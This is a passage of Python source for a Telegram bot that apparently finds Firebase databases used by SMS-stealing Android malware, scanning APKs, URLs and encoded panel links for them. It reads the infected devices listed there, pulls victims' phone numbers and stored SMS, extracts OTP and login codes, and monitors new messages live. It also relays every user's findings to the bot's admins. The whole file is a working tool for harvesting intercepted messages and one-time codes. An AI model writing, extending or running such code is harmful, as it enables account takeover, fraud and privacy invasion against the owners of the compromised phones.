            vercel_url = generate_vercel_link(db_url)
            report += (
                f"<b>{idx}.</b> <code>{db_url}</code>\n"
                f"📦 Total: <code>{total}</code> | 🟢 Online: <code>{online}</code>\n"
                f"🔗 Panel: {vercel_url}\n\n"
            )
    report += "🛡️ <b>VIP ALL IN ONE BOT</b>"
    return report, active, dead_count, total_scanned


def write_sorted_txt(file_path, title, active_list, dead_count=0, total_scanned=0, extra_header=""):
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(f"{title}\n")
        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        if extra_header:
            f.write(extra_header + "\n")
        f.write(f"Scanned: {total_scanned} | Active: {len(active_list)} | Dead/0 filtered: {dead_count}\n")
        f.write("Sorted: High Online → Low\n")
        f.write("=" * 50 + "\n\n")
        for idx, (db_url, total, online) in enumerate(active_list, 1):
            panel = generate_vercel_link(db_url)
            f.write(f"{idx}. {db_url}\n")
            f.write(f"   Total: {total} | Online: {online}\n")
            f.write(f"   Panel: {panel}\n\n")


async def send_bulk_to_admins(user_id, username, source_label, active_list, total_scanned, dead_count, file_path=None):
    caption = (
        f"📥 <b>Bulk/File Scan → Admin</b>\n"
        f"👤 User: <code>{user_id}</code> (@{username})\n"
        f"📌 Source: {source_label}\n"
        f"📊 Scanned: <code>{total_scanned}</code> | 🟢 Active: <code>{len(active_list)}</code> | 💀 Dead: <code>{dead_count}</code>\n"
        f"🛡️ <b>VIP ALL IN ONE</b>"
    )
    try:
        if file_path and os.path.exists(file_path) and active_list:
            await send_document_to_admins(user_id, caption, file_path)
        else:
            for adm in ADMIN_IDS:
                await send_message_raw(adm, caption)
    except Exception as e:
        logger.error("Admin bulk notify error: %s", e)


def extract_firebase_from_vercel_link(link_str):
    extracted_dbs = set()
    try:
        link_str = link_str.strip()
        if "?" in link_str:
            parsed = urllib.parse.urlparse(link_str)
            qs = urllib.parse.parse_qs(parsed.query)
            for param_key in ["s", "m", "data", "q"]:
                if param_key in qs:
                    for val in qs[param_key]:
                        extracted_dbs.update(extract_firebase_from_vercel_link(val))
        candidate = link_str
        for modifier in [lambda x: x, lambda x: x + "==", lambda x: x.replace("-", "+").replace("_", "/")]:
            try:
                mod_str = modifier(candidate)
                padding_needed = len(mod_str) % 4
                if padding_needed:
                    mod_str += "=" * (4 - padding_needed)
                decoded_bytes = base64.b64decode(mod_str)
                decoded_str = decoded_bytes.decode("utf-8", errors="ignore")
                if decoded_str.startswith("MERGED:::") or decoded_str.startswith("[") or "{" in decoded_str:
                    clean_json_str = decoded_str.replace("MERGED:::", "")
                    try:
                        data_json = json.loads(clean_json_str)
                        if isinstance(data_json, list):
                            for item in data_json:
                                if isinstance(item, dict):
                                    for sub_val in item.values():
                                        if isinstance(sub_val, str) and (
                                            "firebaseio.com" in sub_val
                                            or "firebasedatabase.app" in sub_val
                                            or "-default-rtdb" in sub_val
                                        ):
                                            extracted_dbs.add(sub_val.strip())
                        elif isinstance(data_json, dict):
                            for sub_val in data_json.values():
                                if isinstance(sub_val, str) and (
                                    "firebaseio.com" in sub_val
                                    or "firebasedatabase.app" in sub_val
                                    or "-default-rtdb" in sub_val
                                ):
                                    extracted_dbs.add(sub_val.strip())
                    except Exception:
                        pass
                parts = decoded_str.split("|||")
                for p in parts:
                    sub_p = p.split("|")
                    for sp in sub_p:
                        sp_clean = sp.strip()
                        if "firebaseio.com" in sp_clean or "firebasedatabase.app" in sp_clean or "-default-rtdb" in sp_clean:
                            extracted_dbs.add(sp_clean)
                        elif sp_clean.startswith("http"):
                            extracted_dbs.add(sp_clean)
                if "firebaseio.com" in decoded_str or "firebasedatabase.app" in decoded_str:
                    matches = re.findall(
                        r"https?://[a-zA-Z0-9_.-]+(?:firebaseio\.com|firebasedatabase\.app)", decoded_str
                    )
                    for m in matches:
                        extracted_dbs.add(m)
            except Exception:
                pass
        if "firebaseio.com" in link_str or "firebasedatabase.app" in link_str or "-default-rtdb" in link_str:
            matches = re.findall(
                r"https?://[a-zA-Z0-9_.-]+(?:firebaseio\.com|firebasedatabase\.app)", link_str
            )
            if matches:
                for m in matches:
                    extracted_dbs.add(m)
            else:
                extracted_dbs.add(link_str)
    except Exception:
        pass
    return list(extracted_dbs) if extracted_dbs else [link_str]


def extract_urls_from_binary(data_bytes: bytes) -> set:
    found = set()
    try:
        text = data_bytes.decode("utf-8", errors="ignore") if isinstance(data_bytes, bytes) else str(data_bytes)
    except Exception:
        text = str(data_bytes)
    matches = re.findall(r"https?://[a-zA-Z0-9_.-]+(?:firebaseio\.com|firebasedatabase\.app)", text)
    for m in matches:
        if "your-project" not in m:
            found.add(m)
    domains = re.findall(r"[a-zA-Z0-9_-]+-default-rtdb\.[a-z0-9.-]+", text)
    for d in domains:
        if not d.startswith("http"):
            d = "https://" + d
        if "your-project" not in d:
            found.add(d)
    return found


def extract_firebase_from_apk(file_path: str) -> tuple:
    found_databases = set()
    try:
        with zipfile.ZipFile(file_path, "r") as apk_zip:
            for filename in apk_zip.namelist():
                try:
                    file_data = apk_zip.read(filename)
                    found_databases.update(extract_urls_from_binary(file_data))
                except Exception:
                    pass
        resolved_list = []
        for db in found_databases:
            unpacked = extract_firebase_from_vercel_link(db)
            resolved_list.extend(unpacked)
        resolved_set = list(set(resolved_list))[:2000]
        if resolved_set:
            result_text = f"📦 <b>Lightning APK Scan Successful!</b>\n\n<b>Found Databases ({len(resolved_set)}):</b>\n"
            for idx, db_url in enumerate(resolved_set, 1):
                vercel_url = generate_vercel_link(db_url)
                result_text += f"\n{idx}. <code>{db_url}</code>\n\n🔗 <b>Panel Link:</b>\n{vercel_url}\n\n"
            result_text += "🛡️ <b>VIP ALL IN ONE BOT</b>"
            return result_text, resolved_set
        return "⚠️ No Firebase database URL resolved.\n\n🛡️ <b>VIP ALL IN ONE BOT</b>", []
    except Exception as e:
        return f"❌ Error: <code>{str(e)}</code>\n\n🛡️ <b>VIP ALL IN ONE BOT</b>", []


async def extract_firebase_from_url(target_url: str) -> tuple:
    headers = {"User-Agent": "Mozilla/5.0"}
    found_databases = set()
    unpacked_urls = extract_firebase_from_vercel_link(target_url)
    for u in unpacked_urls:
        if "firebaseio.com" in u or "firebasedatabase.app" in u or "-default-rtdb" in u:
            found_databases.add(u)
    try:
        if not target_url.startswith("http"):
            target_url = "https://" + target_url
        async with httpx.AsyncClient(follow_redirects=True) as client:
            response = await client.get(target_url, headers=headers, timeout=4)
            found_databases.update(extract_urls_from_binary(response.content))
            extra_unpacked = extract_firebase_from_vercel_link(response.text)
            for eu in extra_unpacked:
                if "firebaseio.com" in eu or "firebasedatabase.app" in eu or "-default-rtdb" in eu:
                    found_databases.add(eu)
        final_dbs = list(found_databases)[:2000]
        if final_dbs:
            batch_results = await parse_batch_panels(final_dbs)
            result_text, active_list, dead_count, total_scanned = build_sorted_report(
                f"Lightning Scanned Successfully!\n🌐 Target: <code>{target_url}</code>",
                batch_results,
            )
            return result_text, [db for db, _, _ in active_list] or final_dbs
        return "⚠️ No Firebase URL found.\n\n🛡️ <b>VIP ALL IN ONE BOT</b>", []
    except Exception as err:
        if found_databases:
            final_dbs = list(found_databases)[:2000]
            batch_results = await parse_batch_panels(final_dbs)
            result_text, active_list, dead_count, total_scanned = build_sorted_report(
                "Parsed from Link Payload!", batch_results
            )
            return result_text, [db for db, _, _ in active_list] or final_dbs
        return f"❌ Error: <code>{str(err)}</code>\n\n🛡️ <b>VIP ALL IN ONE BOT</b>", []


async def download_telegram_file(file_id: str) -> str:
    try:
        async with httpx.AsyncClient() as client:
            res = await client.get(f"{TG_GATEWAY}/getFile", params={"file_id": file_id}, timeout=10)
            file_path_info = res.json().get("result", {}).get("file_path")
            if not file_path_info:
                return None
            download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path_info}"
            file_resp = await client.get(download_url, timeout=30)
            temp_file = os.path.join(tempfile.gettempdir(), f"target_cyber_{time.time()}.tmp")
            with open(temp_file, "wb") as f:
                f.write(file_resp.content)
            return temp_file
    except Exception:
        return None


async def log_for_admin_with_status(user_id, username, target_type, details, target_input):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    normalized_details = []
    for d in details:
        unpacked = extract_firebase_from_vercel_link(d)
        for u in unpacked:
            if u not in normalized_details and (
                "firebaseio.com" in u or "firebasedatabase.app" in u or "-default-rtdb" in u
            ):
                normalized_details.append(u)
    async with CHECKER_LOG_LOCK:
        ADMIN_LOGS.append(
            {
                "time": timestamp,
                "user_id": user_id,
                "username": username,
                "type": target_type,
                "details": normalized_details,
            }
        )
    admin_msg = (
        f"🚨 <b>New Extraction!</b>\n"
        f"👤 User: <code>{user_id}</code> (@{username})\n"
        f"📌 Type: {target_type}\n"
        f"🌐 Target: {target_input}\n\n"
        f"<b>Databases Found & Status:</b>\n"
    )
    batch_results = await parse_batch_panels(normalized_details[:2000])
    await store_user_databases(user_id, batch_results)
    active_sorted = filter_and_sort_active(batch_results, min_online=1)
    dead_count = len(batch_results) - len(active_sorted)
    admin_msg += (
        f"📊 Scanned: <code>{len(batch_results)}</code> | 🟢 Active: <code>{len(active_sorted)}</code> | "
        f"💀 Dead/0: <code>{dead_count}</code>\n"
        f"📌 Sorted High Online → Low (dead hidden)\n\n"
    )
    for db, total, online in active_sorted[:50]:
        admin_msg += f"• <code>{db}</code>\n  📦 Total: <code>{total}</code> | 🟢 Online: <code>{online}</code>\n\n"
    if len(active_sorted) > 50:
        admin_msg += f"... and {len(active_sorted) - 50} more active\n\n"
    admin_msg += "🛡️ <b>VIP ALL IN ONE BOT</b>"
    for adm in ADMIN_IDS:
        await send_message_raw(adm, admin_msg)


async def handle_export_command(chat_id, user_id):
    if user_id not in ADMIN_IDS:
        return
    today_str = datetime.now().strftime("%Y-%m-%d")
    today_dbs = set()
    async with CHECKER_LOG_LOCK:
        for log in ADMIN_LOGS:
            if log["time"].startswith(today_str):
                for db in log["details"]:
                    unpacked = extract_firebase_from_vercel_link(db)
                    for u in unpacked:
                        if "firebaseio.com" in u or "firebasedatabase.app" in u or "-default-rtdb" in u:
                            today_dbs.add(u)
    today_dbs = list(today_dbs)[:2000]
    if not today_dbs:
        await send_message_raw(
            chat_id,
            f"📊 <b>Daily Export ({today_str}):</b>\n\nKoi database nahi mila aaj!\n\n🛡️ <b>VIP ALL IN ONE BOT</b>",
        )
        return
    file_path = os.path.join(tempfile.gettempdir(), f"VIP_AllInOne_Export_{today_str}.txt")
    with open(file_path, "w", encoding="utf-8") as f:
        for db_url in today_dbs:
            vercel_link = generate_vercel_link(db_url)
            f.write(f"{db_url}\n\n{vercel_link}\n\n")
    await send_document_to_admins(
        chat_id,
        f"📁 <b>Export ({today_str})</b>\n🔥 Total DBs: <code>{len(today_dbs)}</code>\n🛡️ <b>VIP ALL IN ONE BOT</b>",
        file_path,
    )
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception:
        pass


# ============================================================
# FIREBASE HELPERS
# ============================================================
def normalize_fb_url(url: str) -> Optional[str]:
    try:
        if not url or not isinstance(url, str):
            return None
        u = url.strip()
        if not u.startswith("http"):
            return None
        if "firebaseio.com" not in u and "firebasedatabase.app" not in u:
            return None
        u = u.rstrip("/")
        while u.endswith(".json"):
            u = u[:-5].rstrip("/")
        return u
    except Exception:
        return None


def _load_global_device_cache():
    try:
        with open(GLOBAL_DEVICE_CACHE_FILE, "r", encoding="utf-8") as fh:
            saved = json.load(fh)
        if not isinstance(saved, dict) or not isinstance(saved.get("devices"), dict):
            return {"devices": {}, "online_count": 0, "offline_count": 0,
                    "per_fb": {}, "updated_at": ""}
        if "per_fb" not in saved:
            saved["per_fb"] = {}
        return saved
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        return {"devices": {}, "online_count": 0, "offline_count": 0,
                "per_fb": {}, "updated_at": ""}


def _save_global_device_cache(cache):
    try:
        tmp = f"{GLOBAL_DEVICE_CACHE_FILE}.tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump(cache, fh, ensure_ascii=False)
        os.replace(tmp, GLOBAL_DEVICE_CACHE_FILE)
    except OSError as exc:
        logger.warning("could not save device cache: %s", exc)


global_device_cache = _load_global_device_cache()


def fb_host_short(url: str) -> str:
    try:
        s = url.replace("https://", "").replace("http://", "")
        s = s.replace(".firebaseio.com", "").replace(".firebasedatabase.app", "")
        return s.split(".")[0][:30]
    except Exception:
        return url[:30]


def build_fb_endpoint(base_url: str, path: str = "", query: str = "") -> str:
    base = base_url.rstrip("/")
    p = (path or "").strip("/")
    q = (query or "").strip().lstrip("?")
    url = f"{base}/{p}/.json" if p else f"{base}/.json"
    if q:
        url += f"?{q}"
    return url


async def fb_get_json(session, url, *, timeout=FB_REQUEST_TIMEOUT,
                      max_bytes=FB_CLIENTS_MAX_BYTES, retries=FB_RETRY_MAX):
    last_err = ""
    for attempt in range(retries + 1):
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                status = resp.status
                if status == 413:
                    return None, "TOO_LARGE", "HTTP 413"
                cl = resp.headers.get("Content-Length")
                if cl and cl.isdigit() and int(cl) > max_bytes:
                    return None, "TOO_LARGE", f"CL {cl}"
                body = b""
                async for chunk in resp.content.iter_chunked(8192):
                    body += chunk
                    if len(body) > max_bytes:
                        return None, "TOO_LARGE", "too big"
                text = body.decode("utf-8", errors="ignore").strip()
                if status in (401, 403):
                    return None, "ACCESS_DENIED", f"HTTP {status}"
                if status == 404:
                    return None, "NOT_FOUND", "HTTP 404"
                if status in (408, 504):
                    last_err = f"HTTP {status}"
                    if attempt < retries:
                        await asyncio.sleep(FB_RETRY_BACKOFF ** attempt)
                        continue
                    return None, "TIMEOUT", last_err
                if status == 429 or 500 <= status < 600:
                    last_err = f"HTTP {status}"
                    if attempt < retries:
                        await asyncio.sleep(FB_RETRY_BACKOFF ** attempt)
                        continue
                    return None, "HTTP_ERROR", last_err
                if status >= 400:
                    return None, "HTTP_ERROR", f"HTTP {status}"
                if not text or text == "null":
                    return None, "EMPTY_DATA", "null/empty"
                try:
                    data = json.loads(text)
                except json.JSONDecodeError:
                    return None, "INVALID_JSON", "json decode"
                if data is None:
                    return None, "EMPTY_DATA", "null"
                return data, "SUCCESS", ""
        except asyncio.TimeoutError:
            last_err = "timeout"
            if attempt < retries:
                await asyncio.sleep(FB_RETRY_BACKOFF ** attempt)
                continue
            return None, "TIMEOUT", last_err
        except aiohttp.ClientError as e:
            last_err = f"{type(e).__name__}"
            if attempt < retries:
                await asyncio.sleep(FB_RETRY_BACKOFF ** attempt)
                continue
            return None, "CONNECTION_ERROR", last_err
        except Exception as e:
            return None, "OTHER_ERROR", str(e)[:80]
    return None, "OTHER_ERROR", last_err or "retries exhausted"


def _get_device_name(info, cid):
    if not isinstance(info, dict):
        return cid
    for key in ("modelName", "model", "deviceName", "name"):
        v = info.get(key)
        if v and str(v).strip() and str(v) != "-":
            return str(v).strip()
    return cid


def _get_mob_no(info):
    if not isinstance(info, dict):
        return ""
    raw = (info.get("mobNo") or info.get("mob_no") or info.get("mobile")
           or info.get("phoneNumber") or info.get("phone") or "")
    if not raw:
        return ""
    digits = re.sub(r"\D", "", str(raw))
    if len(digits) == 12 and digits.startswith("91"):
        digits = digits[2:]
    elif len(digits) == 11 and digits.startswith("0"):
        digits = digits[1:]
    if len(digits) == 10 and digits[0] in "6789":
        return digits
    return ""


def _newest_messages(msgs, limit=FB_MESSAGES_LIMIT):
    if not isinstance(msgs, dict):
        return []
    try:
        keys = sorted(msgs.keys(), key=lambda x: int(x), reverse=True)
    except (TypeError, ValueError):
        keys = list(msgs.keys())[::-1]
    return [msgs[k] for k in keys[:limit] if isinstance(msgs.get(k), dict)]


def _newest_with_keys(msgs, limit=FB_MESSAGES_LIMIT):
    if isinstance(msgs, list):
        out = []
        for i, value in list(enumerate(msgs))[-limit:][::-1]:
            if isinstance(value, dict):
                out.append((str(i), value))
        return out
    if not isinstance(msgs, dict):
        return []

    def _sort_token(k):
        s = str(k)
        try:
            return (0, int(s), "")
        except (TypeError, ValueError):
            return (1, 0, s)

    keys = sorted(msgs.keys(), key=_sort_token, reverse=True)
    out = []
    for k in keys[:limit]:
        v = msgs.get(k)
        if isinstance(v, dict):
            out.append((str(k), v))
    return out


def _extract_msg_body(m: dict) -> str:
    if not isinstance(m, dict):
        return ""
    for key in ("body", "message", "msg", "text", "content",
                "sms", "smsBody", "messageBody", "SMS", "msgBody"):
        v = m.get(key)
        if v is not None and str(v).strip():
            return str(v).strip()
    return ""


def _extract_msg_sender(m: dict) -> str:
    if not isinstance(m, dict):
        return "Unknown"
    for key in ("sender", "from", "address", "number", "phone",
                "phoneNumber", "mobile", "mobNo", "src", "originator",
                "senderNumber", "fromNumber"):
        v = m.get(key)
        if v is not None and str(v).strip():
            return str(v).strip()
    return "Unknown"


def _extract_msg_time(m: dict, fallback_key: str = "") -> str:
    if isinstance(m, dict):
        for key in ("time", "timestamp", "date", "receivedTime", "received_at",
                    "sentTime", "dateTime", "createdAt"):
            v = m.get(key)
            if v is not None and str(v).strip():
                return _format_time(v)
    if fallback_key:
        return _format_time(fallback_key)
    return "Unknown"


def _extract_otp(body: str) -> Optional[str]:
    if not body:
        return None
    text = str(body).replace("\u200b", " ").replace("\u00a0", " ")
    
    # Universal TEST code detection conditions
    patterns = [
        r'\b(?:OTP|code|verification|verify|login|passcode)\D{0,20}(\d{4,8})\b',
        r'\b(\d{4,8})\b(?:\D{0,20})(?:OTP|code|verification|verify|login)\b',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            try:
                candidate = match.group(1)
                if candidate and candidate.isdigit() and 4 <= len(candidate) <= 8:
                    return candidate
            except:
                pass
    
    return None


def _otp_short_message(sender: str, body: str) -> str:
    parts = [part for part in re.split(r"[-_\s]+", str(sender)) if part]
    brand = "SMS"
    for part in parts:
        p = part.strip()
        if len(p) >= 3 and p.upper() not in ("S", "VM", "MSG", "SMS"):
            brand = p
            break
    return f"{brand.title()} login code received."


def _extract_number(sender: str) -> str:
    if not sender:
        return ""
    digits = re.sub(r'\D', '', sender)
    if len(digits) >= 10:
        return digits[-10:]
    return ""


def extract_phone_from_messages(msgs) -> Optional[str]:
    try:
        if not isinstance(msgs, dict):
            return None
        counts = Counter()
        for m in _newest_messages(msgs, limit=15):
            if not isinstance(m, dict):
                continue
            text = _extract_msg_body(m)
            for pat in _PHONE_PATTERNS:
                for num in pat.findall(text):
                    d = re.sub(r'\D', '', num)
                    if len(d) == 10 and d[0] in '6789':
                        counts[d] += 1
                    elif len(d) == 12 and d.startswith('91') and d[2] in '6789':
                        counts[d[2:]] += 1
        return counts.most_common(1)[0][0] if counts else None
    except Exception:
        return None


# ============================================================
# FIREBASE FETCH
# ============================================================
async def _try_fetch_clients(session, fb_url: str):
    data, status, _ = await fb_get_json(session, build_fb_endpoint(fb_url, ""))
    if status == "SUCCESS" and isinstance(data, dict):
        clients = None
        if isinstance(data.get("clients"), dict):
            clients = data["clients"]
        elif isinstance(data.get("devices"), dict):
            clients = data["devices"]
        messages = data.get("messages") if isinstance(data.get("messages"), dict) else {}
        if isinstance(clients, dict) and clients:
            return clients, messages
    (cdata, cst, _), (ddata, dst, _) = await asyncio.gather(
        fb_get_json(session, build_fb_endpoint(fb_url, "clients"),
                    max_bytes=FB_CLIENTS_MAX_BYTES, retries=0),
        fb_get_json(session, build_fb_endpoint(fb_url, "devices"),
                    max_bytes=FB_CLIENTS_MAX_BYTES, retries=0),
    )
    if cst == "SUCCESS" and isinstance(cdata, dict) and cdata:
        return cdata, {}
    if dst == "SUCCESS" and isinstance(ddata, dict) and ddata:
        return ddata, {}
    return {}, {}


async def _fetch_phone_lookup(session, fb_url: str, cid: str):
    try:
        murl = build_fb_endpoint(fb_url, f"messages/{cid}",
                                 query='orderBy="$key"&limitToLast=15')
        fetched, status, _ = await fb_get_json(
            session, murl, max_bytes=FB_CLIENTS_MAX_BYTES,
            timeout=min(FB_REQUEST_TIMEOUT, 4), retries=0)
        if status == "SUCCESS" and isinstance(fetched, dict):
            return cid, extract_phone_from_messages(fetched)
    except Exception:
        pass
    return cid, None


async def fetch_devices_from_one(fb_url: str, fb_tag: str,
                                 only_online: bool = True,
                                 prefetched=None) -> Dict[str, dict]:
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
    result = {}
    try:
        clients, messages_node = prefetched or await _try_fetch_clients(session, fb_url)
        if not clients:
            return {}
        phone_lookups = {}
        lookup_ids = [
            str(cid) for cid, info in clients.items()
            if isinstance(info, dict)
            and (not only_online or info.get("status") is True)
            and not _get_mob_no(info)
            and not isinstance(messages_node.get(cid), dict)
        ][:50]
        if lookup_ids:
            lookup_results = await asyncio.gather(*[
                _fetch_phone_lookup(session, fb_url, cid) for cid in lookup_ids
            ], return_exceptions=True)
            phone_lookups = {
                cid: phone for result in lookup_results
                if isinstance(result, tuple)
                for cid, phone in [result]
                if phone
            }
        for cid, info in clients.items():
            try:
                if not isinstance(info, dict):
                    continue
                is_online = info.get("status") is True
                if only_online and not is_online:
                    continue
                if not only_online and is_online:
                    continue
                phone = _get_mob_no(info)
                if not phone:
                    m_data = messages_node.get(cid) if isinstance(messages_node, dict) else None
                    if not isinstance(m_data, dict):
                        try:
                            ext = phone_lookups.get(str(cid))
                            if ext:
                                phone = ext
                        except Exception:
                            pass
                    if isinstance(m_data, dict) and m_data:
                        ext = extract_phone_from_messages(m_data)
                        if ext:
                            phone = ext
                if not phone:
                    continue
                prefixed_id = f"{fb_tag}|{cid}"
                result[prefixed_id] = {
                    "name": _get_device_name(info, cid),
                    "phone": phone,
                    "raw": info,
                    "online": is_online,
                    "fb_url": fb_url,
                    "fb_tag": fb_tag,
                    "real_cid": cid,
                }
            except Exception:
                continue
        return result
    finally:
        try:
            await session.close()
        except Exception:
            pass


async def fetch_counts_from_one(fb_url: str, fb_tag: str, prefetched=None) -> Tuple[int, int]:
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
    online = 0
    offline = 0
    try:
        clients, _ = prefetched or await _try_fetch_clients(session, fb_url)
        if not clients:
            return 0, 0
        for cid, info in clients.items():
            try:
                if not isinstance(info, dict):
                    continue
                is_online = info.get("status") is True
                if is_online:
                    online += 1
                else:
                    offline += 1
            except Exception:
                continue
        return online, offline
    finally:
        try:
            await session.close()
        except Exception:
            pass


async def fetch_counts_all_firebases(fb_list: List[tuple], prefetched=None) -> Tuple[int, int, Dict[str, dict]]:
    prefetched = prefetched or {}
    tasks = [fetch_counts_from_one(url, tag, prefetched=prefetched.get(url))
             for url, tag in fb_list]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    total_online = 0
    total_offline = 0
    per_fb: Dict[str, dict] = {}
    for (url, tag), r in zip(fb_list, results):
        if isinstance(r, Exception) or not r:
            per_fb[tag] = {"online": 0, "offline": 0}
            continue
        per_fb[tag] = {"online": r[0], "offline": r[1]}
        total_online += r[0]
        total_offline += r[1]
    return total_online, total_offline, per_fb


async def fetch_devices_all_firebases(fb_list: List[tuple],
                                       only_online: bool = True,
                                       max_per_fb: int = 100,
                                       prefetched=None) -> Dict[str, dict]:
    prefetched = prefetched or {}
    tasks = [fetch_devices_from_one(url, tag, only_online,
                                     prefetched=prefetched.get(url))
             for url, tag in fb_list]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    merged = {}
    for r in results:
        if isinstance(r, Exception) or not r:
            continue
        for k, v in list(r.items())[:max_per_fb]:
            merged[k] = v
    return merged


async def refresh_global_device_cache():
    global global_device_cache, _last_refresh_time
    if not global_fb_list:
        global_device_cache = {
            "devices": {}, "online_count": 0, "offline_count": 0,
            "per_fb": {},
            "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        _save_global_device_cache(global_device_cache)
        _last_refresh_time = time.monotonic()
        return global_device_cache
    try:
        devices_task = fetch_devices_all_firebases(
            global_fb_list, only_online=True, max_per_fb=150)
        counts_task = fetch_counts_all_firebases(global_fb_list)
        devices, (online_count, offline_count, per_fb) = await asyncio.gather(
            devices_task, counts_task)
        global_device_cache = {
            "devices": devices or {},
            "online_count": len(devices or {}),
            "raw_online_count": online_count,
            "offline_count": offline_count,
            "per_fb": per_fb or {},
            "updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        _save_global_device_cache(global_device_cache)
        _last_refresh_time = time.monotonic()
    except Exception as exc:
        logger.error("global device cache refresh failed: %s", exc)
    return global_device_cache


async def _global_device_refresh_loop():
    global _last_refresh_time
    while True:
        try:
            await refresh_global_device_cache()
            _last_refresh_time = time.monotonic()
            await asyncio.sleep(ADMIN_DEVICE_REFRESH_INTERVAL)
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            logger.error("global device refresh loop: %s", exc)
            await asyncio.sleep(ADMIN_DEVICE_REFRESH_INTERVAL)


async def fetch_last_sms(fb_url: str, device_id: str, limit: int = FB_MESSAGES_LIMIT):
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
    try:
        url = build_fb_endpoint(fb_url, f"messages/{device_id}",
                                query=f'orderBy="$key"&limitToLast={limit}')
        data, status, _ = await fb_get_json(session, url)
        if status == "SUCCESS" and isinstance(data, (dict, list)):
            return _newest_with_keys(data, limit=limit)
        url = build_fb_endpoint(fb_url, f"messages/{device_id}")
        data, status, _ = await fb_get_json(session, url)
        if status != "SUCCESS" or not isinstance(data, (dict, list)):
            return []
        return _newest_with_keys(data, limit=limit)
    finally:
        try:
            await session.close()
        except Exception:
            pass


# ============================================================
# SESSION STORE
# ============================================================
user_sessions: Dict[int, dict] = {}
sms_monitor_tasks: Dict[int, asyncio.Task] = {}
sms_monitor_state: Dict[int, dict] = {}
admin_panel_live_tasks: Dict[int, asyncio.Task] = {}
bot_instance: Optional[Bot] = None
BOT_USERNAME: str = "VIP_OTP_Bot"


# ============================================================
# FORCE JOIN HELPERS
# ============================================================
def _is_member_status(status: str) -> bool:
    return status in {"member", "administrator", "creator"}


async def get_unjoined_channels(bot, user_id: int) -> List[dict]:
    unjoined = []
    if user_id in ADMIN_IDS:
        return unjoined
    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=channel["id"], user_id=user_id)
            if not _is_member_status(member.status):
                unjoined.append(channel)
        except Exception:
            unjoined.append(channel)
    return unjoined


async def check_force_join(bot, user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return True
    if not REQUIRED_CHANNELS:
        return True
    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=channel["id"], user_id=user_id)
            if not _is_member_status(member.status):
                return False
        except Exception:
            return False
    return True


async def _check_required_channels(bot, uid: int):
    missing = []
    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=channel["id"], user_id=uid)
            if not _is_member_status(member.status):
                missing.append(channel["label"])
        except Exception as exc:
            logger.warning("force join check failed for %s: %s", channel["id"], exc)
            missing.append(channel["label"])
    return not missing, missing


def build_dynamic_force_join_keyboard(unjoined_channels: List[dict]) -> InlineKeyboardMarkup:
    rows: List[List[InlineKeyboardButton]] = []
    styles = ["danger", "primary", "danger", "primary"]
    for i, c in enumerate(unjoined_channels):
        style = styles[i % len(styles)]
        try:
            btn = InlineKeyboardButton(
                text=f"𝗝𝗢𝗜𝗡 {c.get('label','CHANNEL')[:25]}",
                url=c["url"],
                api_kwargs={"style": style}
            )
        except TypeError:
            btn = InlineKeyboardButton(
                text=f"𝗝𝗢𝗜𝗡 {c.get('label','CHANNEL')[:25]}", url=c["url"])
        rows.append([btn])
    try:
        check_btn = InlineKeyboardButton(
            text="✅ 𝗖𝗛𝗘𝗖𝗞 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣",
            callback_data="force_verify",
            api_kwargs={"style": "success"})
    except TypeError:
        check_btn = InlineKeyboardButton(
            text="✅ 𝗖𝗛𝗘𝗖𝗞 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣", callback_data="force_verify")
    rows.append([check_btn])
    return InlineKeyboardMarkup(rows)


def _force_join_kb():
    rows = []
    for channel in REQUIRED_CHANNELS:
        if channel.get("url"):
            try:
                rows.append([InlineKeyboardButton(
                    f"🔗 𝗝𝗢𝗜𝗡 {channel['label']}",
                    url=channel["url"],
                    api_kwargs={"style": "primary"})])
            except TypeError:
                rows.append([InlineKeyboardButton(
                    f"🔗 𝗝𝗢𝗜𝗡 {channel['label']}", url=channel["url"])])
    rows.append([styled_button("✅ 𝗩𝗘𝗥𝗜𝗙𝗬 𝗝𝗢𝗜𝗡", "force_verify", "success")])
    return InlineKeyboardMarkup(rows)


def build_forcejoin_caption(first_name: str = "User") -> str:
    return (
        "🔗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗝𝗢𝗜𝗡 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗\n\n"
        f"👋 Hi {first_name}!\n\n"
        "Join all channels below, then tap\n"
        "✅ 𝗖𝗛𝗘𝗖𝗞 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣"
    )


def build_welcome_caption_joined(first_name: str, user_id: int) -> str:
    safe_name = (first_name or "User").strip()
    refer_link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"

    if user_id in ADMIN_IDS:
        remaining = "Unlimited ♾️"
    else:
        remaining = format_remaining_time(user_id)

    rec = _ensure_user_record(user_id)
    ref_count = rec.get("referral_count", 0)

    return (
        f"{pe('party')} Hi <b>{html_escape(safe_name)}</b>\n\n"
        f"{pe('vip')} <b>VIP ALL IN ONE BOT</b> {pe('diamond')}\n"
